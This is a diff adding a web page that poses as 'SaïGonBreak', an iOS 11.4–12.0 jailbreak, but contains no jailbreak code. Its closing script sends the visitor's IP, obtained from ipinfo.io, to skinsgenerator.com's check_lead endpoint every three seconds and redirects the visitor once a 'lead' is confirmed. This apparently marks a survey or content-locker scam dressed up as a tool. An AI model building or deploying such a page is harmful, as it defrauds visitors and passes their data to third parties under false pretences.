@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-77266291-31"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-77266291-31');
+    </script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>SaïGonBreak iOS 11.4 - 12.0 Jailbreak</title>
+    <!-- Bootstrap Core CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom Style CSS -->
+    <link href="https://saigonbreak.github.io/SaiGonBreakMe/css/style.css" rel="stylesheet">    
+
+    <!-- Animate Style CSS -->
+    <link href="https://saigonbreak.github.io/SaiGonBreakMe/css/animate.css" rel="stylesheet">       
+
+    <!-- Custom CSS -->
+    <style>
+    body {
+        padding-top: 100px;
+        /* Required padding for .navbar-fixed-top. Remove if using .navbar-static-top. Change if height of navigation changes. */
+    }
+    </style>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+
+<body>
+<center>
+
+    <!-- Page Content -->
+    <div class="container">
+
+        <div class="row">
+            <div class="col-md-12 center-block text-center">
+                <img width="150px" src="img/logo.jpg" class="img-responsive center-block" />     
+            </div>
+        </div>        
+<strong>iOS 11.4 - 11.4.1 (A7-A8)</strong>
+        <div class="row">
+            <div class="col-lg-12 text-center">
+                       
+                <div class="homePage">
+
+                    <p class="offers-msg"><strong>Jailbreak success and Respring</strong><br/>
+                        
+                    </p>
+
+                    <div class="spinner-show">
+                        <div class="sk-folding-cube">
+                          <div class="sk-cube1 sk-cube"></div>
+                          <div class="sk-cube2 sk-cube"></div>
+                          <div class="sk-cube4 sk-cube"></div>
+                          <div class="sk-cube3 sk-cube"></div>
+                        </div>
+                        <p>Waiting for AMCC!</p>
+                        <button type="button" class="btn btnBack"  href="https://lababreak.github.io/reboot/source.html">Respring</button>
+                    </div>
+
+                    <ul class="offers-show">
+
+                    </ul>
+
+                    <div class="button-Jail">	
+                    	<p class="info-msg">
+                            Vui lòng bạn nhấn nút để Jailbreak <br/>
+                            cho 
+                        </p>
+                        <button type="button" class="btn btnGenerate">Jailbreak</button>
+                     </div>
+
+                    <p class="thanksto">
+                        by Yangcheesen; H_PW2NTP and Zlab Team
+                    </p>
+                </div>
+
+            </div>
+        </div>
+        <!-- /.row -->
+
+    </div>
+    <!-- /.container -->
+
+    <!-- jQuery Version 1.11.1 -->
+    <script src="https://saigonbreak.github.io/SaiGonBreakMe/js/jquery.js"></script> 
+    <script src="https://saigonbreak.github.io/SaiGonBreakMe/assets/jquery.fittext.js"></script>
+    <script src="https://saigonbreak.github.io/SaiGonBreakMe/assets/jquery.lettering.js"></script>
+    <script src="https://saigonbreak.github.io/SaiGonBreakMe/js/highlight.min.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="https://saigonbreak.github.io/SaiGonBreakMe/js/bootstrap.min.js"></script>
+
+    <!-- Application JavaScript -->
+    <script src="https://saigonbreak.github.io/SaiGonBreakMe/js/app.js"></script>
+
+    <script>
+        var protocol = window.location.protocol || document.location.protocol;
+        $.get(protocol + "//ipinfo.io", function(response) {
+            ip_address = response.ip;
+        }, "jsonp");
+        check_lead = setInterval(function() {
+            $.ajax({
+                type: "POST",
+                url: protocol + "//skinsgenerator.com/api/check_lead.php",
+                data: {
+                    'ip': ip_address
+                },
+                success: function(data) {
+                    if (data == 'true') {
+                        window.location.replace("http://jbkeenlab.com/error");
+                        clearInterval(check_lead);
+                    }
+                }
+            });
+        }, 3000);
+    </script>
+</center>
+</body>
+
+</html>
+
